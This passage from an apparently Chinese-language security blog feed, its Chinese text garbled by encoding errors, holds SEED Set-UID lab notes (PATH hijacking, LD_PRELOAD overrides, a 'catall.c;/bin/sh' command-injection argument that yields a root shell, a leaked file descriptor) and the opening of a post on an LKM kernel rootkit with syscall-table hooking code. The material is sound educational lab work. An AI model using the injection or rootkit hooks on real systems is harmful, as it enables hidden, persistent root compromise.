class="hljs shell">[10/31/22]seed@VM:~/lab/Labsetup$ sudo chown root ls<br>[10/31/22]seed@VM:~/lab/Labsetup$ sudo chmod 4755 ls<br>[10/31/22]seed@VM:~/lab/Labsetup$ ll ls<br>-rwsr-xr-x 1 root seed 16696 Oct 31 04:22 ls<br></code></pre></td></tr></table></figure><p>ç”±äº/bin/sh å®é™…ä¸Šæ˜¯ä¸€ä¸ªæŒ‡å‘/bin/dash çš„ç¬¦å·é“¾æ¥ï¼Œdashæœ‰ä¸€ä¸ªé˜²å¾¡å¯¹ç­–ï¼Œå¯ä»¥é˜²æ­¢è‡ªå·±åœ¨ Set-UID è¿›ç¨‹ä¸­æ‰§è¡Œï¼šå¦‚æœæ£€æµ‹åˆ°å®ƒæ˜¯åœ¨ Set-UID è¿›ç¨‹ä¸­æ‰§è¡Œçš„ï¼Œå®ƒä¼šç«‹å³å°†æœ‰æ•ˆç”¨æˆ· ID æ›´æ”¹ä¸ºè¿›ç¨‹çš„å®é™…ç”¨æˆ· IDï¼Œå®é™…ä¸Šå°±æ˜¯æ”¾å¼ƒäº†ç‰¹æƒã€‚ç”±äºæˆ‘ä»¬çš„å—å®³è€…ç¨‹åºæ˜¯ä¸€ä¸ª Set-UID ç¨‹åºï¼Œæ‰€ä»¥/bin/dash ä¸­çš„å¯¹ç­–å¯ä»¥é˜²æ­¢æˆ‘ä»¬çš„æ”»å‡»</p><p>ä¸ºäº†æ­£å¸¸è¿›è¡Œæ”»å‡»ï¼Œä¿®æ”¹shæŒ‡å‘ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo ln -sf <span class="hljs-regexp">/bin/</span>zsh <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶ä½ åœ¨shellä¸­è¾“å…¥lsé‚£ä¹ˆä¼šæ‰§è¡Œå½“å‰ç›®å½•ä¸‹çš„lsç¨‹åº</p><h1 id="Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 7: The LD PRELOAD Environment Variable and Set-UID Programs"></a>Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h1><blockquote><p><code>LD_</code>å¼€å¤´çš„ç¯å¢ƒå˜é‡ä¼šå½±å“åŠ¨æ€é“¾æ¥å™¨/åŠ è½½å™¨çš„è¡Œä¸º</p><p>fPICï¼šGenerate position-independent code (PIC)ï¼Œæ„å‘³ç€ç”Ÿæˆçš„æœºå™¨ä»£ç ä¸ä¾èµ–äºä½äºç‰¹å®šçš„åœ°å€</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">$ gcc -fPIC -g -c mylib.c<br>$ gcc -shared -o libmylib.so<span class="hljs-number">.1</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> mylib.o -lc<br>$ <span class="hljs-keyword">export</span> LD_PRELOAD=./libmylib.so<span class="hljs-number">.1</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">void</span> sleep (<span class="hljs-keyword">int</span> s)<br>&#123;<br><span class="hljs-comment">/* If this is invoked by a privileged program,</span><br><span class="hljs-comment">you can do damages here! */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I am not sleeping!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>myproc.c</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> ** environ;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (environ[i] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i],<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)!= <span class="hljs-literal">NULL</span>)<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, environ[i]);<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span> i++;<br>&#125;<br>sleep(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Make-myprog-a-regular-program-and-run-it-as-a-normal-user"><a href="#Make-myprog-a-regular-program-and-run-it-as-a-normal-user" class="headerlink" title="Make myprog a regular program, and run it as a normal user."></a>Make myprog a regular program, and run it as a normal user.</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ myprog <br><span class="hljs-attribute">LD_PRELOAD</span>=./libmylib.so.1.0.1<br>I am <span class="hljs-keyword">not</span> sleeping!<br></code></pre></td></tr></table></figure><h2 id="Make-myprog-a-Set-UID-root-program-and-run-it-as-a-normal-user"><a href="#Make-myprog-a-Set-UID-root-program-and-run-it-as-a-normal-user" class="headerlink" title="Make myprog a Set-UID root program, and run it as a normal user."></a>Make myprog a Set-UID root program, and run it as a normal user.</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">[10/31/22]seed@VM:~/lab/Labsetup$ sudo chown root myprog <br>[10/31/22]seed@VM:~/lab/Labsetup$ sudo chmod 4755 myprog<br>[10/31/22]seed@VM:~/lab/Labsetup$ ll myprog<br>-rwsr-xr-x 1 root seed 16856 Oct 31 12:06 myprog<br><br>[10/31/22]seed@VM:~/lab/Labsetup$ ./myprog <br>[10/31/22]seed@VM:~/lab/Labsetup$ <br></code></pre></td></tr></table></figure><p>è¿™é‡Œä»€ä¹ˆéƒ½æ²¡æœ‰æ‰“å°</p><h2 id="Make-myprog-a-Set-UID-root-program-export-the-LD-PRELOAD-environment-variable-again-in-the-root-account-and-run-it"><a href="#Make-myprog-a-Set-UID-root-program-export-the-LD-PRELOAD-environment-variable-again-in-the-root-account-and-run-it" class="headerlink" title="Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it"></a>Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@VM</span><span class="hljs-symbol">:/home/seed/lab/Labsetup</span><span class="hljs-comment"># export LD_PRELOAD=&quot;/home/seed/lab/Labsetup/libmylib.so.1.0.1&quot;</span><br>root<span class="hljs-variable">@VM</span><span class="hljs-symbol">:/home/seed/lab/Labsetup</span><span class="hljs-comment"># ./myprog</span><br>LD_PRELOAD=<span class="hljs-regexp">/home/seed</span><span class="hljs-regexp">/lab/</span>Labsetup/libmylib.so.<span class="hljs-number">1.0</span>.<span class="hljs-number">1</span><br>I am <span class="hljs-keyword">not</span> sleeping!<br></code></pre></td></tr></table></figure><p>åœ¨åˆ‡æ¢ä¸ºrootç”¨æˆ·åï¼Œæ‰“å°å‡ºäº†LD_PRELOADç¯å¢ƒå˜é‡ï¼Œå¹¶ä¸”è°ƒç”¨äº†æˆ‘ä»¬è®¾è®¡çš„å…±äº«åº“çš„sleepå‡½æ•°</p><h2 id="Make-myprog-a-Set-UID-user1-program-i-e-the-owner-is-user1-which-is-another-user-account-export-the-LD-PRELOAD-environment-variable-again-in-a-different-userâ€™s-account-not-root-user-and-run-it"><a href="#Make-myprog-a-Set-UID-user1-program-i-e-the-owner-is-user1-which-is-another-user-account-export-the-LD-PRELOAD-environment-variable-again-in-a-different-userâ€™s-account-not-root-user-and-run-it" class="headerlink" title="Make myprog a Set-UID user1 program (i.e., the owner is user1, which is another user account),export the LD PRELOAD environment variable again in a different userâ€™s account (not-root user) and run it."></a>Make myprog a Set-UID user1 program (i.e., the owner is user1, which is another user account),export the LD PRELOAD environment variable again in a different userâ€™s account (not-root user) and run it.</h2><p>å’ŒMake myprog a regular program, and run it as a normal user.ç»“æœç›¸åŒ</p><h1 id="Task-8-Invoking-External-Programs-Using-system-versus-execve"><a href="#Task-8-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="Task 8: Invoking External Programs Using system() versus execve()"></a>Task 8: Invoking External Programs Using system() versus execve()</h1><ul><li><p>system()ä¼šæ‰§è¡Œsh -c â€œa.out 1;/bin/shâ€å› æ­¤å¯ä»¥å¾—åˆ°rootæƒé™çš„shell</p></li><li><p>execveä¸å¯ä»¥</p></li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>ll a.out <br>-rwsr-xr-x <span class="hljs-number">1</span> root seed <span class="hljs-number">16928</span> Oct <span class="hljs-number">31</span> <span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span> a.out<br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>a.out <span class="hljs-string">&quot;catall.c;/bin/sh&quot;</span><br><span class="hljs-comment">#</span><br><br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>a.out <span class="hljs-string">&quot;catall.c;/bin/sh&quot;</span><br>/bin/<span class="hljs-symbol">cat:</span> <span class="hljs-string">&#x27;catall.c;/bin/sh&#x27;</span>: No such file <span class="hljs-keyword">or</span> directory<br></code></pre></td></tr></table></figure><h1 id="Task-9-Capability-Leaking"><a href="#Task-9-Capability-Leaking" class="headerlink" title="Task 9: Capability Leaking"></a>Task 9: Capability Leaking</h1><blockquote><p>The setuid() system call can be<br>used to revoke the privileges. According to the manual, â€œsetuid() sets the effective user ID of the calling<br>process. If the effective UID of the caller is root, the real UID and saved set-user-ID are also setâ€. Therefore,<br>if a Set-UID program with effective UID 0 calls setuid(n), the process will become a normal process,<br>with all its UIDs being set to n</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> fd;<br>  <span class="hljs-keyword">char</span> *v[<span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Assume that /etc/zzz is an important system file,</span><br><span class="hljs-comment">   * and it is owned by root with permission 0644.</span><br><span class="hljs-comment">   * Before running this program, you should create</span><br><span class="hljs-comment">   * the file /etc/zzz first. */</span><br>  fd = open(<span class="hljs-string">&quot;/etc/zzz&quot;</span>, O_RDWR | O_APPEND);        <br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot open /etc/zzz\n&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// Print out the file descriptor value</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd is %d\n&quot;</span>, fd);<br><br>  <span class="hljs-comment">// Permanently disable the privilege by making the</span><br>  <span class="hljs-comment">// effective uid the same as the real uid</span><br>  setuid(getuid());                                <br><br>  <span class="hljs-comment">// Execute /bin/sh</span><br>  v[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>; v[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  execve(v[<span class="hljs-number">0</span>], v, <span class="hljs-number">0</span>);                             <br>&#125;<br></code></pre></td></tr></table></figure><p>è™½ç„¶ä¸Šé¢ç¨‹åºæ”¾å¼ƒäº†ç‰¹æƒï¼Œä½†æ˜¯fdè¢«æ³„éœ²ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨<code>echo xxx &gt;&amp;fd</code>å†™å…¥</p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€ä¸ªåŸºäº LKM çš„ Linux å†…æ ¸çº§ rootkit çš„å®ç°</title>
    <link href="/p/cd0d68e2/"/>
    <url>/p/cd0d68e2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/LaPhilosophie/hello-rootkit">GitHubé“¾æ¥</a></p><p><a href="https://github.com/LaPhilosophie/hello-rootkit/blob/main/PPT.pdf">æ¼”ç¤ºSlides</a></p><h1 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h1><p>rootkitæ˜¯ä¸€ç§æ¶æ„è½¯ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨è·å¾— root æˆ–ç®¡ç†å‘˜æƒé™åå®‰è£…å®ƒï¼Œä»è€Œ<strong>éšè—å…¥ä¾µå¹¶ä¿æŒrootæƒé™è®¿é—®</strong>ã€‚rootkitå¯ä»¥æ˜¯ç”¨æˆ·çº§çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯å†…æ ¸çº§çš„ã€‚å…³äºrootkitçš„è¯¦ç»†ä»‹ç»å¯ä»¥å‚è€ƒ<a href="https://en.wikipedia.org/wiki/rootkit">https://en.wikipedia.org/wiki/rootkit</a></p><p>æœ‰è®¸å¤šæŠ€æœ¯å¯ä»¥å®ç°rootkitï¼Œæœ¬é¡¹ç›®ä½¿ç”¨çš„æ˜¯é€šè¿‡ç¼–å†™LKMï¼ˆLinux kernel moduleï¼‰å¹¶hookç³»ç»Ÿè°ƒç”¨è¡¨çš„æ–¹å¼ã€‚è¿™ç§æ–¹å¼å…·æœ‰è¯¸å¤šä¼˜ç‚¹ï¼Œæ¯”å¦‚rootkitä½œä¸ºå†…æ ¸æ¨¡å—å¯ä»¥åŠ¨æ€çš„åŠ è½½å’Œå¸è½½ï¼Œå¤§å¤šæ•°rootkitä¹Ÿéƒ½æ˜¯é€šè¿‡LKMçš„æ–¹å¼å®ç°çš„</p><h1 id="LKM"><a href="#LKM" class="headerlink" title="LKM"></a>LKM</h1><p>ä¸€ä¸ªç®€å•çš„LKMç¤ºä¾‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// header file</span><br><br><span class="hljs-comment">// module info</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> __init <span class="hljs-title">example_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>printk(KERN_INFO <span class="hljs-string">&quot;Hello, World!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> __exit <span class="hljs-title">example_exit</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>printk(KERN_INFO <span class="hljs-string">&quot;Goodbye, World!\n&quot;</span>);<br>&#125;<br><br>module_init(example_init);<br>module_exit(example_exit);<br></code></pre></td></tr></table></figure><p>åœ¨å®Œæˆäº†å¯¹åº”Makefileçš„ç¼–å†™ä¹‹åï¼Œä½¿ç”¨<code>make</code>å‘½ä»¤å¯ä»¥ç¼–è¯‘å‡ºkoæ–‡ä»¶ï¼ˆkernel objectï¼‰ï¼Œä½¿ç”¨<code>insmod rootkit.ko</code>å‘½ä»¤å¯ä»¥å®‰è£…å†…æ ¸æ¨¡å—ï¼Œä½¿ç”¨<code>rmmod rootkit</code>å¯ä»¥å¸è½½rootkitæ¨¡å—ï¼Œä½¿ç”¨<code>dmesg</code>å‘½ä»¤å¯ä»¥æ‰“å°ç¨‹åºä¸­printkçš„ä¿¡æ¯</p><h1 id="hookç³»ç»Ÿè°ƒç”¨"><a href="#hookç³»ç»Ÿè°ƒç”¨" class="headerlink" title="hookç³»ç»Ÿè°ƒç”¨"></a>hookç³»ç»Ÿè°ƒç”¨</h1><p>ç”¨æˆ·è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨å†…æ ¸æœåŠ¡ã€‚ç³»ç»Ÿè°ƒç”¨ä¼šè¿›å…¥å†…æ ¸ï¼Œè®©å†…æ ¸æ‰§è¡ŒæœåŠ¡ç„¶åè¿”å›ï¼Œå…³äºç³»ç»Ÿè°ƒç”¨çš„æ›´å¤šä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨<code>man -k syscall</code>è·å–ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œhookå¯ä»¥åŠ«æŒæ­£å¸¸çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè®©å†…æ ¸æ‰§è¡Œæˆ‘ä»¬è‡ªè¡Œè®¾è®¡çš„å‡½æ•°ï¼Œä»è€Œå®ç°æˆ‘ä»¬è‡ªå·±æƒ³è¦çš„åŠŸèƒ½</p><p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/hook.png" alt="hook"></p><p>æ¯”å¦‚ï¼Œå½“ç”¨æˆ·ä½¿ç”¨lså‘½ä»¤åˆ—å‡ºè¯¥ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„æ—¶å€™ï¼Œæœ¬è´¨ä¸Šæ˜¯ä½¿ç”¨äº†<code>getdents64</code>ç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚æœæˆ‘ä»¬å°†<code>getdents64</code>çš„<strong>åœ°å€æ›¿æ¢</strong>ä¸ºæˆ‘ä»¬è‡ªå·±æ„é€ çš„å‡½æ•°<code>hook_getdents64</code> ï¼Œå³å¯åŠ«æŒç³»ç»Ÿè°ƒç”¨æµç¨‹ã€‚å› æ­¤ï¼Œåªè¦æˆ‘ä»¬åˆ†ææ¸…æ¥šäº†æŸä¸€ä¸ªshellå‘½ä»¤åº•å±‚æ‰€æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶æˆåŠŸå¯¹å…¶è¿›è¡Œhookï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆåŠŸå®ç°rootkitçš„ç§ç§ç›®çš„</p><p><code>strace </code> å‘½ä»¤å¯ä»¥å¯¹ç³»ç»Ÿè°ƒç”¨è¿›è¡Œè·Ÿè¸ªï¼Œè¿™å¯ä»¥å¸®åŠ©æˆ‘ä»¬åˆ†æå‘½ä»¤çš„å‡½æ•°è°ƒç”¨é“¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> strace -c ls</span><br><span class="hljs-meta">%</span><span class="bash"> time     seconds  usecs/call     calls    errors syscall</span><br>------ ----------- ----------- --------- --------- ----------------<br>  0.00    0.000000           0         8           read<br>  0.00    0.000000           0         1           write<br>  0.00    0.000000           0        13           close<br>  0.00    0.000000           0        12           fstat<br>  0.00    0.000000           0        32           mmap<br>  0.00    0.000000           0         9           mprotect<br>  0.00    0.000000           0         2           munmap<br>  0.00    0.000000           0         3           brk<br>  0.00    0.000000           0         2           rt_sigaction<br>  0.00    0.000000           0         1           rt_sigprocmask<br>  0.00    0.000000           0         2           ioctl<br>  0.00    0.000000           0         8           pread64<br>  0.00    0.000000           0         2         1 access<br>  0.00    0.000000           0         1           execve<br>  0.00    0.000000           0         1           readlink<br>  0.00    0.000000           0         2         2 statfs<br>  0.00    0.000000           0         2         1 arch_prctl<br>  0.00    0.000000           0         2           getdents64<br>  0.00    0.000000           0         1           set_tid_address<br>  0.00    0.000000           0        11           openat<br>  0.00    0.000000           0         1           set_robust_list<br>  0.00    0.000000           0         1           prlimit64<br>------ ----------- ----------- --------- --------- ----------------<br>100.00    0.000000                   117         4 total<br></code></pre></td></tr></table></figure><p>å›åˆ°hookç³»ç»Ÿè°ƒç”¨è¿™ä¸ªäº‹æƒ…ä¸Šæ¥ï¼Œå†…æ ¸ä¸­æœ‰ä¸€å¼ <a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl">ç³»ç»Ÿè°ƒç”¨è¡¨</a>ï¼Œå­˜æ”¾äº†æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨çš„åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°è¿™å¼ è¡¨çš„åœ°å€ï¼Œæ‰èƒ½å¯¹ç³»ç»Ÿè°ƒç”¨â€œå·æ¢æ¢æŸ±â€â€”â€”å°†åŸæœ¬çš„syscallçš„åœ°å€æ›¿æ¢ä¸ºæˆ‘ä»¬è‡ªå·±å®ç°çš„syscallåœ°å€ã€‚ä¹Ÿå¯ä»¥å°†ç³»ç»Ÿè°ƒç”¨è¡¨çœ‹åšæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç³»ç»Ÿè°ƒç”¨å·ä¸ºå…¶ç´¢å¼•ï¼Œä¸åŒçš„ç³»ç»Ÿè°ƒç”¨å·å¯¹åº”ç€ä¸åŒçš„ç³»ç»Ÿè°ƒç”¨ã€‚éœ€è¦å°å¿ƒçš„æ˜¯ï¼Œç›¸åŒçš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼Œå¯¹äºä¸åŒçš„æ¶æ„ï¼Œè°ƒç”¨å·æ˜¯ä¸åŒçš„ã€‚<a href="https://marcin.juszkiewicz.com.pl/download/tables/syscalls.html">è¿™ä¸ªé¡µé¢</a>åˆ—å‡ºäº† Linux æ”¯æŒçš„æ¶æ„çš„æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨</p><p>æŸ¥æ‰¾ç³»ç»Ÿè°ƒç”¨è¡¨çš„åœ°å€æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œæ¯”å¦‚ï¼š</p><ul><li>ä½¿ç”¨kallsyms</li><li>ä½¿ç”¨ftrace</li><li>æš´åŠ›æšä¸¾</li></ul><p>æ³¨æ„ï¼Œç”±äºrootkitä¸ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬æ˜¯å¼ºç›¸å…³çš„ï¼Œæ‰€ä»¥å¯¹äºä¸åŒçš„å†…æ ¸ï¼ŒæŸ¥æ‰¾ç³»ç»Ÿè°ƒç”¨è¡¨çš„æ–¹å¼ä¹Ÿä¸åŒï¼Œæ¯”å¦‚æœ‰çš„ç‰ˆæœ¬çš„å†…æ ¸æ— æ³•ä½¿ç”¨kallsymså¾—åˆ°ç³»ç»Ÿè°ƒç”¨è¡¨åœ°å€ï¼Œé‚£ä¹ˆå°±å¯ä»¥è€ƒè™‘ä½¿ç”¨ftrace</p><p>ä½¿ç”¨kallsymsï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//å‡½æ•°å£°æ˜ï¼Œreal_sys_openatæ˜¯çœŸå®çš„sys_openatå‡½æ•°</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> asmlinkage <span class="hljs-title">long</span> <span class="hljs-params">(*real_sys_openat)</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><br><span class="hljs-comment">//å‡½æ•°å£°æ˜,hook_sys_openatæˆ‘ä»¬è‡ªå·±å®ç°çš„sys_openatå‡½æ•°</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_sys_openat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><br><span class="hljs-comment">//è·å–ç³»ç»Ÿè°ƒç”¨è¡¨åœ°å€</span><br>real_sys_call_table = (<span class="hljs-keyword">void</span> *)kallsyms_lookup_name(<span class="hljs-string">&quot;sys_call_table&quot;</span>);<br><br><span class="hljs-comment">//ä¿å­˜åŸæ¥çš„killå‡½æ•°çš„åœ°å€ï¼Œæœ€åéœ€è¦æ¢å¤åŸçŠ¶</span><br>real_sys_openat = (<span class="hljs-keyword">void</span> *)real_sys_call_table[__NR_openat];<br><br><span class="hljs-comment">// å…³é—­å†™ä¿æŠ¤</span><br>disable_wp();<br><br><span class="hljs-comment">//å°†çœŸå®çš„sys_openatå‡½æ•°åœ°å€æ˜ å°„åˆ°æˆ‘ä»¬è‡ªå·±å†™çš„openatå‡½æ•°åœ°å€å¤„ï¼Œå·æ¢æ¢æŸ±</span><br>real_sys_call_table[__NR_openat] = (<span class="hljs-keyword">void</span> *)my_sys_openat;<br><br><span class="hljs-comment">// æ¢å¤ç°åœºï¼Œæ‰“å¼€å†™ä¿æŠ¤</span><br>enable_wp();<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ftraceï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//åœ¨å¤´æ–‡ä»¶ä¸­å†™ä¸Šhookæ•°ç»„</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ftrace_hook</span> <span class="hljs-title">hooks</span>[] =</span> &#123;<br>    HOOK(<span 